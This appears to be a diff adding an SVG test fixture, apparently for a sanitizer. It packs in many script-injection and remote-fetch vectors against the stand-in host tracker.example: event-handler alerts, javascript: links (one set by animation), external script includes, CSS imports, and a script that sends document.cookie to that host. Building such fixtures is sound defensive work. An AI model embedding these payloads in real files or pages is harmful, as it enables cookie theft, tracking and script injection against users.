@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<?xml-stylesheet href="https://tracker.example/sheet.css" type="text/css"?>
+<!-- Made by Test person in /home/test/Lisbon -->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:ev="http://www.w3.org/2001/xml-events"
+     width="240" height="160" viewBox="0 0 240 160" onload="fetch('https://tracker.example/opened')" xml:base="https://tracker.example/">
+  <title>A drawing that would run and fetch</title>
+  <script type="text/javascript"><![CDATA[ document.location = 'https://tracker.example/' + document.cookie ]]></script>
+  <script xlink:href="https://tracker.example/run.js"/>
+  <handler ev:event="load">alert(1)</handler>
+  <style>
+    @import url("https://tracker.example/import.css");
+    @import "https://tracker.example/plain-import.css";
+    .shape { fill: url(#sky); stroke: #4F5B92; stroke-width: 4 }
+    .tracked { background-image: url(https://tracker.example/pixel.png); fill: #E8A33D }
+    .escaped { fill: u\72l(https://tracker.example/escaped) }
+    .old { behavior: url(https://tracker.example/behavior.htc); fill: #2E7D5B }
+    @font-face { font-family: Remote; src: url(https://tracker.example/font.woff2) }
+  </style>
+  <defs>
+    <linearGradient id="sky" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#9FB3F5"/><stop offset="1" stop-color="#4F5B92"/></linearGradient>
+    <filter id="soft"><feGaussianBlur stdDeviation="1.5"/></filter>
+    <filter id="fetching"><feImage href="https://tracker.example/filter.png"/></filter>
+  </defs>
+  <rect class="shape" x="10" y="10" width="100" height="60" rx="12" onclick="alert('clicked')" onmouseover="alert(2)"/>
+  <circle cx="170" cy="40" r="28" class="tracked" filter="url(#soft)" style="stroke: url(https://tracker.example/stroke.svg#s); opacity: 0.9"/>
+  <circle cx="200" cy="40" r="6" class="old escaped"/>
+  <a href="javascript:alert(document.domain)"><text x="12" y="100" font-family="sans-serif" font-size="16">Tap here</text></a>
+  <a xlink:href="https://tracker.example/link"><text x="12" y="124" font-family="sans-serif" font-size="12">A link</text></a>
+  <use xlink:href="https://tracker.example/sprites.svg#star" x="150" y="80"/>
+  <use href="#dot" x="200" y="120"/>
+  <circle id="dot" cx="10" cy="10" r="6" fill="#B3261E"><set attributeName="onclick" to="alert(3)"/><animate attributeName="r" values="6;9;6" dur="2s" repeatCount="indefinite"/></circle>
+  <a><set attributeName="href" to="javascript:alert(4)" begin="0s"/><text x="120" y="150" font-family="sans-serif" font-size="10">Animated link</text></a>
+  <image x="150" y="100" width="20" height="20" href="https://tracker.example/picture.png"/>
+  <iframe src="https://tracker.example/frame"/>
+  <foreignObject x="130" y="110" width="110" height="50">
+    <div xmlns="http://www.w3.org/1999/xhtml" style="font: 12px sans-serif; color: #1D1B20">Label <b>bold</b><img src="https://tracker.example/label.png" onerror="alert(5)"/><script>alert(6)</script><a href="https://tracker.example/x">link</a></div>
+  </foreignObject>
+</svg>
